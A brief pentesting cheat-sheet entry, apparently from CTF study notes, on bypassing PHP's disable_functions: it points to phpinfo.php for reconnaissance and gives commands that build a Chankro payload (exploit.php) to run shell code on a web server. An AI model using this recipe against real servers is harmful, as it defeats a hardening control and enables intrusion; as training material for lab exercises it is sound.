# php
## Handle disabled functions
cf disable_functions in phpinfo.php
check `$_SERVER['DOCUMENT_ROOT']` in phpinfo.php to know where the folder of the webserver is.

For more info, check https://tryhackme.com/room/bypassdisablefunctions

```bash
git clone https://github.com/TarlogicSecurity/Chankro
cd Chankro
python2 chankro.py --arch 64 --input exploit.sh --output exploit.php --path /PATH/TO/DOCUMENT_ROOT
```
